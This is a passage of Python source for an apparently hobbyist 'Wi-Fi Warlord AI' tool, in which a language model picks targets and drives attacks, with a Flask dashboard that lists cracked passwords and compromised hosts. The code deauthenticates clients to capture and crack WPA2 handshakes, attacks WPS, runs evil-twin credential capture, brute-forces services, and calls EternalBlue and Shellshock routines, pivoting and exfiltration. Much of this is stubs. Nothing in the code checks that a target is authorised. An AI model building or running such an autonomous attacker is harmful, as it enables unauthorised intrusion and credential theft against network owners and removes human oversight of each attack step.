            return wan_ip
        except Exception as e:
            update_status(f"Failed to get WAN IP: {e}", "Error")
            return None

    def _load_attack_history(self):
        """Load historical attack data from log files"""
        history_file = os.path.join(SD_CARD_LOG_PATH, "attack_history.json")
        try:
            if os.path.exists(history_file):
                with open(history_file, 'r') as f:
                    return json.load(f)
        except Exception:
            pass
        return []

    def _calculate_success_rates(self, history):
        """Calculate success rates for different attack types"""
        if not history:
            return {}
            
        success_counts = {}
        total_counts = {}
        
        for entry in history:
            attack_type = entry.get('action')
            if attack_type:
                total_counts[attack_type] = total_counts.get(attack_type, 0) + 1
                if entry.get('success'):
                    success_counts[attack_type] = success_counts.get(attack_type, 0) + 1
                    
        return {
            attack_type: (success_counts.get(attack_type, 0) / total_counts[attack_type])
            for attack_type in total_counts
        }

    def _log_attack_result(self, action, target, success, details):
        """Log the result of an attack attempt"""
        entry = {
            "timestamp": time.time(),
            "action": action,
            "target": target,
            "success": success,
            "details": details
        }
        
        history_file = os.path.join(SD_CARD_LOG_PATH, "attack_history.json")
        history = self._load_attack_history()
        history.append(entry)
        
        try:
            with open(history_file, 'w') as f:
                json.dump(history, f)
        except Exception as e:
            update_status(f"Failed to log attack result: {e}", "Warning")

    def exploit_known_vulnerabilities(self, target_ip, port, service):
        """Execute known exploits based on service/version"""
        update_status(f"Attempting known exploits on {target_ip}:{port} ({service})...", "Exploitation")
        try:
            # Add exploit logic based on service/version
            if "http" in service.lower():
                return self._exploit_web_service(target_ip, port)
            elif "smb" in service.lower():
                return self._exploit_smb_service(target_ip)
            elif "ssh" in service.lower() and "7.2" in service:  # Example version check
                return self._exploit_ssh_service(target_ip)
            return False
        except Exception as e:
            update_status(f"Exploit failed: {e}", "Error")
            return False

    def _exploit_web_service(self, target_ip, port):
        """Web-specific exploitation logic"""
        update_status(f"Running web exploits on {target_ip}:{port}...", "Exploitation")
        # Example: Check for common web vulnerabilities
        vulns = self._check_common_web_vulns(target_ip, port)
        if vulns:
            update_status(f"Found web vulnerabilities: {vulns}", "Exploitation")
            return True
        return False

    def _exploit_smb_service(self, target_ip):
        """SMB-specific exploitation logic"""
        update_status(f"Running SMB exploits on {target_ip}...", "Exploitation")
        # Example: EternalBlue if vulnerable
        if self._check_eternalblue_vuln(target_ip):
            update_status("EternalBlue vulnerability found - exploiting...", "Exploitation")
            return self._execute_eternalblue(target_ip)
        return False

    def _exploit_ssh_service(self, target_ip):
        """SSH-specific exploitation logic"""
        update_status(f"Running SSH exploits on {target_ip}...", "Exploitation")
        # Example: Shellshock if vulnerable
        if self._check_shellshock_vuln(target_ip):
            update_status("Shellshock vulnerability found - exploiting...", "Exploitation")
            return self._execute_shellshock(target_ip)
        return False

    def pivot_to_new_host(self, current_host_ip):
        """Use current host to access new hosts"""
        update_status(f"Attempting to pivot from {current_host_ip}...", "Pivoting")
        # Example: Scan adjacent networks via current host
        new_hosts = self._scan_via_pivot(current_host_ip)
        if new_hosts:
            update_status(f"Discovered {len(new_hosts)} new hosts via pivot", "Pivoting")
            warlord_state["compromised_hosts"].update(new_hosts)
            return True
        return False

    def data_exfiltration(self, target_ip, data_path):
        """Exfiltrate interesting data from target"""
        update_status(f"Exfiltrating data from {target_ip}:{data_path}...", "Exfiltration")
        try:
            # Example: Download interesting files
            if self._download_files(target_ip, data_path):
                update_status(f"Successfully exfiltrated data from {target_ip}", "Exfiltration")
                return True
            return False
        except Exception as e:
            update_status(f"Exfiltration failed: {e}", "Error")
            return False

    def execute_post_exploitation_sequence(self):
        update_status("Starting post-exploitation...", "Post-Exploitation")
        decision = self.get_post_exploitation_decision()
        if not decision or "action" not in decision:
            update_status("AI failed to provide a valid post-exploitation decision. Defaulting to network scan.", "Error")
            _, subnet_range = self.lan.get_local_ip_and_subnet()
            if subnet_range: 
                results = self.lan.run_nmap_scan(subnet_range)
                if results:
                    summary = self.summarize_vulns(results)
                    update_status(f"Vulnerability Summary: {json.dumps(summary, indent=2)}", "Reconnaissance")
            return

        action = decision.get("action")
        if action == "SCAN_NETWORK":
            _, subnet_range = self.lan.get_local_ip_and_subnet()
            if subnet_range: 
                results = self.lan.run_nmap_scan(subnet_range)
                if results:
                    summary = self.summarize_vulns(results)
                    update_status(f"Vulnerability Summary: {json.dumps(summary, indent=2)}", "Reconnaissance")
                # After network scan, attempt auto-SSH
                self.auto_ssh_all(subnet_range)
        
        elif action == "VULNERABILITY_SCAN":
            target_ip = decision.get("target_ip")
            port = decision.get("port")
            if target_ip and port: 
                results = self.lan.run_nikto_scan(target_ip, port)
                if results:
                    summary = self.summarize_vulns({target_ip: {"vulnerabilities": {port: results}}})
                    update_status(f"Vulnerability Summary for {target_ip}:{port}: {json.dumps(summary, indent=2)}", "Reconnaissance")
            else: update_status("Vulnerability scan requires target_ip and port.", "Error")

        elif action == "BRUTE_FORCE_SERVICE":
            target_ip = decision.get("target_ip")
            port = decision.get("port")
            service = decision.get("service")
            if target_ip and port and service:
                self.lan.brute_force_service(target_ip, port, service, self.cracker.common_passwords)
            else: update_status("Brute force attack requires target_ip, port, and service.", "Error")

        elif action == "SCAN_SMB_SHARES":
            target_ip = decision.get("target_ip")
            if target_ip: self.lan.scan_smb_shares(target_ip)
            else: update_status("SMB scan requires target_ip.", "Error")

    def ai_main_loop(self):
        update_status("AI Warlord starting...", "Running")
        warlord_state["ai_running"] = True
        if not self.llm_client.setup_llm():
            update_status("Critical Error: Could not initialize LLM.", "Error")
            warlord_state["ai_running"] = False
            return

        while not warlord_state["stop_signal"].is_set():
            if not warlord_state["cracked_networks"]:
                networks = self.wifi.scan_wifi_networks()
                available = [n for n in networks if n.get("ssid") not in warlord_state["cracked_networks"]]
                if not available:
                    time.sleep(30)
                    continue

                decision = self.get_wifi_attack_decision(available)
                if not decision or "target_ssid" not in decision:
                    time.sleep(10)
                    continue

                target_ssid = decision["target_ssid"]
                target_net = next((n for n in available if n["ssid"] == target_ssid), None)
                if not target_net: continue

                success = False
                action = decision.get("action")

                if action == "CONNECT_OPEN":
                    success = self.wifi_attack_module.connect_to_network(target_ssid)
                    if success: warlord_state["cracked_networks"][target_ssid] = "N/A (Open)"
                
                elif action == "ATTACK_WPA2":
                    handshake_file = self.wifi_attack_module.deauth_and_capture_handshake(target_ssid, target_net["bssid"], target_net["channel"])
                    if handshake_file:
                        password = self.cracker.crack_handshake(handshake_file, target_ssid)
                        if password:
                            success = self.wifi_attack_module.connect_to_network(target_ssid, password)
                            if success: warlord_state["cracked_networks"][target_ssid] = password
                
                elif action == "ATTACK_WPS":
                    password = self.wifi_attack_module.attack_wps(target_net["bssid"])
                    if password:
                        success = self.wifi_attack_module.connect_to_network(target_ssid, password)
                        if success: warlord_state["cracked_networks"][target_ssid] = password

                elif action == "ATTACK_EVIL_TWIN":
                    if self.wifi_attack_module.start_evil_twin(target_ssid, target_net["channel"], self.llm_client):
                        update_status(f"Evil Twin for {target_ssid} is active. Monitoring for credentials.", "Wi-Fi Attack")
                    
                if success:
                    log_to_sd_card("cracked_wifi.log", f"{target_ssid}:{warlord_state['cracked_networks'][target_ssid]}")
                    save_state()
                    self.execute_post_exploitation_sequence()
                else:
                    update_status(f"Attack on {target_ssid} with method {action} failed or did not yield access.", "Wi-Fi Attack Failed", target_ssid)
            else:
                self.execute_post_exploitation_sequence()
            
            save_state()
            warlord_state["stop_signal"].wait(timeout=60)
        
        self.llm_client.close()
        # Clean up any running subprocesses like hostapd
        for proc in warlord_state.get("active_processes", []):
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                pass
        update_status("AI Warlord stopped.", "Stopped")

# --- Web Dashboard (Flask) & Main Entry Point ---
from flask import Flask, render_template_string, jsonify, request

web_app = Flask(__name__)
DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head><title>Warlord AI</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-gray-900 text-white p-8">
    <h1 class="text-4xl text-blue-400 mb-4">Wi-Fi Warlord AI Dashboard</h1>
    <div class="grid grid-cols-2 gap-4">
        <div><h2 class="text-xl">Status: <span id="status" class="text-yellow-400"></span></h2></div>
        <div><h2 class="text-xl">Phase: <span id="phase" class="text-yellow-400"></span></h2></div>
        <div><h2 class="text-xl">Target: <span id="target" class="text-yellow-400"></span></h2></div>
        <div><h2 class="text-xl">Cracked: <span id="cracked-count" class="text-green-400"></span></h2></div>
    </div>
    <div class="my-4">
        <button id="start-btn" class="bg-blue-500 p-2 rounded">Start AI</button>
        <button id="stop-btn" class="bg-red-500 p-2 rounded">Stop AI</button>
    </div>
    <h2 class="text-2xl mt-4">Log Stream</h2>
    <div id="log-stream" class="bg-black p-4 h-64 overflow-y-scroll font-mono"></div>
    <h2 class="text-2xl mt-4">Cracked Networks</h2>
    <div id="cracked-list" class="bg-black p-4 font-mono"></div>
    <h2 class="text-2xl mt-4">Compromised Hosts</h2>
    <div id="host-list" class="bg-black p-4 font-mono"></div>
    <script>
        function fetchStatus() {
            fetch('/status').then(res => res.json()).then(data => {
                document.getElementById('status').textContent = data.status;
                document.getElementById('phase').textContent = data.current_phase;
                document.getElementById('target').textContent = data.current_target_ssid;
                document.getElementById('cracked-count').textContent = Object.keys(data.cracked_networks).length;
                document.getElementById('log-stream').innerHTML = data.log_stream.join('<br>');
                document.getElementById('log-stream').scrollTop = document.getElementById('log-stream').scrollHeight;
                let crackedHtml = '';
                for (const ssid in data.cracked_networks) {
                    crackedHtml += `SSID: ${ssid}, Pass: ${data.cracked_networks[ssid]}<br>`;
                }
                document.getElementById('cracked-list').innerHTML = crackedHtml;
                let hostHtml = '';
                for (const ip in data.compromised_hosts) {
                    const host = data.compromised_hosts[ip];
                    hostHtml += `<b>IP: ${ip}</b> (OS: ${host.os})<br>`;
                    for (const port in host.ports) {
                        const p = host.ports[port];
                        hostHtml += `&nbsp;&nbsp;- Port ${port}: ${p.service} (${p.product} ${p.version})<br>`;
                    }
                    for (const port in host.vulnerabilities) {
                        hostHtml += `&nbsp;&nbsp;- Vulns on ${port}:<pre>${host.vulnerabilities[port]}</pre><br>`;
                    }
                    for (const service in host.credentials) {
                        hostHtml += `&nbsp;&nbsp;- Cracked Creds for ${service}: ${host.credentials[service]}<br>`;
                    }
                    if (host.shares && host.shares.length > 0) {
                        hostHtml += `&nbsp;&nbsp;- SMB Shares: ${host.shares.join(', ')}<br>`;
                    }
                }
                document.getElementById('host-list').innerHTML = hostHtml;
            });
        }
        function sendCommand(cmd) { fetch('/command', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({command: cmd}) }); }
        document.getElementById('start-btn').onclick = () => sendCommand('start_ai');
        document.getElementById('stop-btn').onclick = () => sendCommand('stop_ai');
        setInterval(fetchStatus, 2000);
        fetchStatus();
    </script>
</body>
</html>
"""

@web_app.route('/')
def index(): return render_template_string(DASHBOARD_HTML)

@web_app.route('/status')
def get_status(): return jsonify(warlord_state)

@web_app.route('/command', methods=['POST'])
def handle_command():
    command = request.json.get('command')
    if command == "start_ai" and not warlord_state["ai_running"]:
        warlord_state["stop_signal"].clear()
        threading.Thread(target=ai_decision_maker.ai_main_loop, daemon=True).start()
        return jsonify({"status": "AI started"})
    elif command == "stop_ai" and warlord_state["ai_running"]:
        warlord_state["stop_signal"].set()
        warlord_state["ai_running"] = False
        return jsonify({"status": "AI stopping"})
    return jsonify({"status": "Invalid command or state"}), 400

if __name__ == "__main__":
    load_state() # Load previous state on startup
    llm_client = StackFlowClient(LLM_ZMQ_ENDPOINT)
    ai_decision_maker = AIDecisionMaker(llm_client)

    update_status("Starting Web Dashboard...", "UI Init")
    web_app.run(host='0.0.0.0', port=8081, debug=False)
